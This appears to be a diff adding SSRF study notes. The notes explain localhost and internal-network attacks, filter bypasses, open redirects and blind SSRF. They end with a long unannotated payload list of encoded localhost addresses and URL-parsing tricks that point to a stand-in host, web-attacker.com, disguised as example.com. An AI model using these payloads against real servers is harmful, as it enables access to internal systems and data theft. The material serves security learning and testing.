@@ -1,0 +1,344 @@
+What is SSRF?
+Server-Side Request Forgery (SSRF) is a web security vulnerability where an attacker tricks a server into making requests to a location it was not supposed to access.
+In a typical SSRF attack, the attacker makes the server connect to internal services inside the organization's network. These services are usually not accessible from outside.
+In some cases, the attacker can also make the server connect to external systems. This may expose sensitive information such as authorization credentials or other confidential data.
+
+What is the impact of SSRF attacks?
+A successful SSRF attack can let an attacker access internal data or systems the application can reach. In some cases, it can even allow the attacker to run commands. If the server connects to external sites, it can also be used to launch attacks that look like they’re coming from the organization.
+
+Common SSRF attacks
+SSRF attacks often take advantage of trust between systems. The attacker uses the vulnerable application to gain higher access and perform unauthorized actions.
+These trust relationships may exist between the server and other internal systems within the same organization.
+SSRF Attacks Against the Server
+In this type of SSRF attack, the attacker makes the application send a request back to its own server using localhost or 127.0.0.1.
+Normally, pages like /admin are restricted to authenticated users. But when the request comes from the local machine, the application may trust it and allow access without proper checks.
+This happens because:
+•	Security checks might be done by another component (like a firewall).
+•	Internal requests may bypass those checks.
+•	Some systems allow local admin access for recovery purposes.
+Because of this trust in local requests, SSRF can allow attackers to access administrative functionality.
+________________________________________
+SSRF Attacks Against Other Back-End Systems
+Sometimes, the application server can access internal systems that users cannot directly reach. These systems usually use private IP addresses and rely on network protection instead of strong authentication.
+If an SSRF vulnerability exists, the attacker can make the server request these internal systems and return the response.
+Since internal systems often have weaker security, this can expose sensitive data or administrative functions.
+
+Circumventing common SSRF defenses
+It is common to see applications containing SSRF behavior together with defenses aimed at preventing malicious exploitation. Often, these defenses can be circumvented.
+SSRF with Blacklist-Based Input Filters
+In this case, the application tries to stop SSRF by blocking specific dangerous values like 127.0.0.1, localhost, or /admin.
+This is called a blacklist because it blocks certain known bad inputs.
+The problem is that attackers can write the same address in a different format or hide it using encoding. Since the filter only looks for exact blocked words, it can often be bypassed.
+So blacklist protection is weak because it tries to block known bad patterns instead of properly restricting where the server can connect.
+
+SSRF with Whitelist-Based Input Filters
+Here, the application only allows specific trusted domains. This is called a whitelist.
+For example, it may only allow URLs from a certain approved website.
+However, attackers can manipulate the structure of a URL so that it looks like it belongs to an allowed domain but actually points somewhere else. This happens because URL parsing can be complex, and the validation logic may not match how the server really interprets the URL.
+So even though the URL appears valid to the filter, the server may still connect to an unintended internal or malicious system.
+
+ Bypassing SSRF Using Open Redirection
+In this case, the application correctly allows only trusted domains. But one of those trusted domains has an open redirect vulnerability.
+An open redirect means that a website can automatically redirect users to another URL.
+An attacker provides a safe-looking allowed URL. The application accepts it. But when the server requests it, that URL redirects to an internal system. If the server follows the redirect, it ends up accessing the internal resource.
+So the filter checks only the first URL, but not the final destination after redirection.
+
+Blind SSRF Vulnerabilities
+What is Blind SSRF?
+Blind SSRF happens when an attacker can make the server send a request to a URL they provide, but the attacker cannot see the server’s response.
+The server makes the request, but the result is not shown in the application’s response.
+So the attacker does not directly see what happened.
+________________________________________
+What is the Impact?
+Blind SSRF is usually less powerful than normal SSRF because the attacker cannot directly read sensitive data.
+However, it can still be dangerous. In some cases, it can:
+•	Interact with internal systems
+•	Trigger internal actions
+•	Sometimes even lead to remote code execution
+________________________________________
+How to Find Blind SSRF
+Since the response is not visible, attackers use out-of-band (OAST) techniques.
+This means:
+1.	The attacker sends a special URL that they control.
+2.	If the server tries to access that URL,
+3.	The attacker can see the request on their own system.
+Tools like Burp Collaborator help with this by:
+•	Generating a unique domain.
+•	Monitoring if the server connects to it.
+If the server makes a request to that domain, it confirms the SSRF vulnerability.
+________________________________________
+Important Note
+Sometimes you may only see a DNS lookup but not a full HTTP request.
+This happens because:
+•	The server tried to resolve the domain name (DNS lookup),
+•	But network rules blocked the actual HTTP connection.
+Some systems allow DNS traffic but block HTTP requests.
+
+Finding Hidden Attack Surface for SSRF
+Some SSRF vulnerabilities are easy to find because the application directly uses full URLs in request parameters.
+But sometimes SSRF is harder to notice because the application does not clearly show a full URL.
+________________________________________
+Partial URLs in Requests
+Sometimes the application only takes part of a URL, like:
+•	A hostname
+•	Or a part of a path
+The server then builds the full URL internally and makes the request.
+You may not control the entire URL, so exploiting it can be more limited. But it can still be a possible SSRF entry point.
+________________________________________
+URLs Inside Data Formats
+Some applications accept structured data like XML.
+XML allows URLs to be included inside the data.
+When the server processes this data, it might automatically request those URLs.
+This can lead to:
+•	XXE vulnerabilities
+•	Or SSRF through XXE
+So SSRF may exist inside data formats, not just normal URL parameters.
+________________________________________
+SSRF via the Referer Header
+Some applications use analytics software to track visitors.
+They log the Referer header, which shows where the user came from.
+In some cases, the analytics system visits the URL in the Referer header to analyze it.
+If an attacker puts a malicious URL in the Referer header, the server may automatically visit it.
+This can create an SSRF vulnerability.
+
+
+https://%09web-attacker.com/
+https://%0Aweb-attacker.com/
+%0D%0A//web-attacker.com
+%0D%0A\\web-attacker.com
+https://%5B::%5D/
+https://%5B::1%5D/
+https://%5B::1%5D%40%5B::1%5D%40web-attacker.com/
+https://%5B::ffff:0.0.0.0%5D/
+https://%5B::ffff:0000:0000%5D/
+https://%5B::ffff:127.0.0.1%5D/
+https://%5B::ffff:7f00:1%5D/
+https://%5B::%EF%AC%80%EF%AC%80:7f00:1%5D/
+https://%5B0:0:0:0:0:ffff:127.0.0.1%5D/
+https://%5B0:0:0:0:0:ffff:1%E3%89%97.0.0.1%5D/
+https://%5B0:0:0:0:0:ffff:%E2%91%AB7.0.0.1%5D/
+https://%5B0:0:0:0:0:%EF%AC%80%EF%AC%80:127.0.0.1%5D/
+https://%5B0000::1%5D/
+https://%5B0000:0000:0000:0000:0000:0000:0000:0000%5D/
+https://%5B0000:0000:0000:0000:0000:0000:0000:0001%5D/
+https://%400/
+%40web-attacker.com
+http:%40web-attacker.com
+https:%40web-attacker.com
+///web-attacker.com
+//web-attacker.com
+/\web-attacker.com
+/&bsol;/web-attacker.com
+/&NewLine;/web-attacker.com
+/&sol;/web-attacker.com
+/&Tab;/web-attacker.com
+\%09\web-attacker.com
+\%0A\web-attacker.com
+\/\/web-attacker.com
+\/web-attacker.com
+https://\\web-attacker.com/
+http:\\web-attacker.com\
+https://\l\o\c\a\l\h\o\s\t/
+#web-attacker.com
+https://0/
+0:80
+https://0.0.0.0/
+https://0000.0000.0000.0000/
+https://00000177.00000000.00000000.00000001/
+https://0177.0000.0000.0001/
+https://017700000001/
+https://0%E2%91%B0700000001/
+https://0x00000000/
+https://0x100000000/
+https://0x17f000001/
+https://0x17f000002/
+https://0x7F.0.0000.00000001/
+https://0x7F.0.0000.0001/
+https://0x7f.0x00.0x00.0x01/
+https://0x7f.0x00.0x00.0x02/
+https://0x7F.1/
+https://0x7f000001/
+https://0x7f000002/
+https://127.0.0.1/
+https://1%E3%89%97.0.0.1/
+https://%E2%91%AB7.0.0.1/
+https://127.0.0.1%40127.0.0.1%40web-attacker.com/
+https://127.0.0.2/
+https://1%E3%89%97.0.0.2/
+https://%E2%91%AB7.0.0.2/
+https://127.0.1/
+https://127.000000000000000.1/
+https://127.1/
+https://2130706433/
+https://21307064%E3%89%9D/
+https://2130706%E3%8A%B83/
+https://21%E3%89%9A706433/
+https://2%E2%91%AC0706433/
+https://%E3%89%9130706433/
+https://%E3%89%91%E3%89%9A%E2%91%A6%E2%93%AA%E2%91%A5%E2%91%A3%E3%89%9D/
+https://45080379393/
+http://anythingexample.com/
+https://anythingexample.com/
+https://example.com &%40web-attacker.com# %40web-attacker.com/
+https://example.com;.web-attacker.com/
+https://example.com:%40web-attacker.com/
+https://example.com:443:\%40%40web-attacker.com/
+https://example.com:443\%40web-attacker.com/
+https://example.com:443#\%40web-attacker.com/
+https://example.com:anything%40web-attacker.com/
+https://example.com?%40web-attacker.com/
+https://example.com.%5F.web-attacker.com/
+https://example.com.-.web-attacker.com/
+https://example.com.%2C.web-attacker.com/
+https://example.com.;.web-attacker.com/
+https://example.com.%21.web-attacker.com/
+https://example.com.%27.web-attacker.com/
+https://example.com.".web-attacker.com/
+https://example.com.%28.web-attacker.com/
+https://example.com.%29.web-attacker.com/
+https://example.com.{.web-attacker.com/
+https://example.com.}.web-attacker.com/
+https://example.com.*.web-attacker.com/
+https://example.com.&.web-attacker.com/
+https://example.com.`.web-attacker.com/
+https://example.com.+.web-attacker.com/
+https://example.com.=.web-attacker.com/
+https://example.com.%7E.web-attacker.com/
+https://example.com.%24.web-attacker.com/
+https://example.com.local/
+https://example.com.localhost/
+https://example.com.web-attacker.com/
+https://example.com%5B%40web-attacker.com/
+https://example.com%40web-attacker.com/
+https://example.com\;%40web-attacker.com/
+https://example.com&anything%40web-attacker.com/
+https://example.com#web-attacker.com/
+https://example.com%2523web-attacker.com/
+https://example.comweb-attacker.com/
+https://foo%40web-attacker.com %40example.com/
+https://foo%40web-attacker.com:443%40example.com/
+https://localhost/
+https://%C2%ADlocalhost/
+https://%CD%8Flocalhost/
+https://%E1%A0%8Blocalhost/
+https://%E1%A0%8Clocalhost/
+https://%E1%A0%8Dlocalhost/
+https://%E1%A0%8Elocalhost/
+https://%E1%A0%8Flocalhost/
+https://%E2%80%8Blocalhost/
+https://%E2%81%A0localhost/
+https://%E2%81%A4localhost/
+https://localho%EF%AC%86/
+https://lo%E3%8E%88host/
+https://localho%EF%AC%85/
+http://localhost.web-attacker.com/
+https://localhost.web-attacker.com/
+https://localhost%40localhost%40web-attacker.com/
+http://sexample.com/
+http:web-attacker.com
+https:web-attacker.com
+%01http://web-attacker.com
+%02http://web-attacker.com
+%03http://web-attacker.com
+%04http://web-attacker.com
+%05http://web-attacker.com
+%06http://web-attacker.com
+%07http://web-attacker.com
+%08http://web-attacker.com
+%09http://web-attacker.com
+%0Ahttp://web-attacker.com
+%0Bhttp://web-attacker.com
+%0Chttp://web-attacker.com
+%0Dhttp://web-attacker.com
+%0Ehttp://web-attacker.com
+%0Fhttp://web-attacker.com
+%10http://web-attacker.com
+%11http://web-attacker.com
+%12http://web-attacker.com
+%13http://web-attacker.com
+%14http://web-attacker.com
+%15http://web-attacker.com
+%16http://web-attacker.com
+%17http://web-attacker.com
+%18http://web-attacker.com
+%19http://web-attacker.com
+%1Ahttp://web-attacker.com
+%1Bhttp://web-attacker.com
+%1Chttp://web-attacker.com
+%1Dhttp://web-attacker.com
+%1Ehttp://web-attacker.com
+%1Fhttp://web-attacker.com
+ http://web-attacker.com
+h%09ttp://web-attacker.com
+h%0Attp://web-attacker.com
+h%0Dttp://web-attacker.com
+http%09://web-attacker.com
+http%0A://web-attacker.com
+http%0D://web-attacker.com
+%09http%09://web-attacker.com
+%0Ahttp%0A://web-attacker.com
+%0Dhttp%0D://web-attacker.com
+http:/\web-attacker.com
+http:/\\web-attacker.com
+http:\\web-attacker.com
+http:\web-attacker.com
+http:/web-attacker.com
+http:/0/web-attacker.com
+https://%E2%80%8Bweb-attacker.com/
+https://%E2%81%A0web-attacker.com/
+https://%C2%ADweb-attacker.com/
+https://web-attacker.com%09example.com/
+https://web-attacker.com%0Aexample.com/
+https://web-attacker.com%0D%0Aexample.com/
+https://web-attacker.com%0Dexample.com/
+https://web-attacker.com%E2%80%A8example.com/
+https://web-attacker.com%E2%80%A9example.com/
+https://web-attacker.com %40example.com/
+https://web-attacker.com &%40example.com/
+https://web-attacker.com example.com/
+https://web-attacker.com;https://example.com/
+https://web-attacker.com:\%40%40example.com/
+0://web-attacker.com:80;http://example.com:80/
+https://web-attacker.com?=.example.com/
+https://web-attacker.com?=example.com/
+https://web-attacker.com?example.com/
+https://web-attacker.com?http://example.com/
+https://web-attacker.com?https://example.com/
+https://web-attacker.com../
+http://web-attacker.com.example.com/
+https://web-attacker.com.example.com/
+https://web-attacker.com%EF%BC%8Eexample.com/
+https://web-attacker.com%40%40example.com/
+https://web-attacker.com%40example.com/
+https://web-attacker.com/?d=example.com/
+https://web-attacker.com/.example.com/
+https://web-attacker.com///example.com/
+https://web-attacker.com/example.com/
+https://web-attacker.com\.example.com/
+https://web-attacker.com\%40%40example.com/
+https://web-attacker.com\anything%40example.com/
+https://web-attacker.com\example.com/
+https://web-attacker.com&%40example.com/
+https://web-attacker.com%EF%BC%86example.com/
+https://web-attacker.com%EF%B9%A0example.com/
+https://web-attacker.com#%40example.com/
+https://web-attacker.com#\%40example.com/
+https://web-attacker.com#example.com/
+https://web-attacker.com%250d%250a%40example.com/
+https://web-attacker.com%2523%40example.com/
+https://web-attacker.com%252e%40example.com/
+https://web-attacker.com%252f%40example.com/
+https://web-attacker.com%253a443.example.com/
+https://web-attacker.com%25ffexample.com/
+https://web-attacker.com+%40example.com/
+https://web-attacker.com+&%40example.com/
+%00http://web-attacker.com
+https://web-attacker.com?%00example.com/
+https://web-attacker.com#%00example.com/
+https://web-attacker.com%00example.com/
+
+
+
+
+
+
